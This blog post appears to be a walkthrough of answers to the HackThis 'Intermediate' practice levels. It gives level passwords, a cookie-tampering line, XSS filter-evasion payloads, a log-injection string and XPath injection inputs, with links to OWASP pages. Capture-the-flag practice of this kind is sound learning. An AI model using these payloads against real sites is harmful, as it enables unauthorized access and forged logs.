---
layout: post
title: "Intermediate"
date: 2017-03-25 15:40:05 +0800
comments: true
categories: 

---

## Intermediate Level 1

```
$.get("https://www.hackthis.co.uk/levels/intermediate/1",{password:"flubergump"})
```

## Intermediate Level 2

```
$.post("https://www.hackthis.co.uk/levels/intermediate/2",{password:"flubergump"})
```

## Intermediate Level 3

[Here](https://stackoverflow.com/questions/15603561/how-can-i-debug-a-http-post-in-chrome) is how you can inspect all the get, post request happened in the network request process.

```
3?enter
```

```
Cookie:restricted_login=false
```

```
document.cookie="restricted_login=true"
```

## Intermediate Level 4

```
<ScRipt>document.write('<scri');

document.write('pt>');

document.write("alert('HackThis!!');")

document.write('</scri');

document.write('pt>"');

</ScRipt>
```

```
<ScripT>alert('HackThis!!');</sCriPt>
```

XSS Filter Evasion [Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).

OWASP: open web application security project.

OWASP Cheat Sheet [Series](https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series).

```
<scr<script>ipt>alert('HackThis!!');</scr</script>ipt>
```
## Intermediate Level 5

[log injection](https://www.owasp.org/index.php/Log_Injection)

`twenty-one%0a%0aINFO:+User+logged+out%3dbadguy`

```
Apr 02 11:09:24: Failed password for songzy from 59.66.123.1
Apr 02 11:10:42: Failed password for songzy from 59.66.123.1
```

`songzy from 59.66.123.1\nApr 02 11:10:42: Failed password for songzy` 

## Intermediate Level 6

[XPath Injection](https://www.owasp.org/index.php/XPATH_Injection)

```
Username: blah' or 1=1 or 'a'='a
Password: blah

FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 
        'a'='a' And Password/text()='blah']

Logically this is equivalent to:
        //Employee[(UserName/text()='blah' or 1=1) or 
        ('a'='a' And Password/text()='blah')]
```

```
' or realname/text()='Sandra Murphy' or 'a'='a
blah
```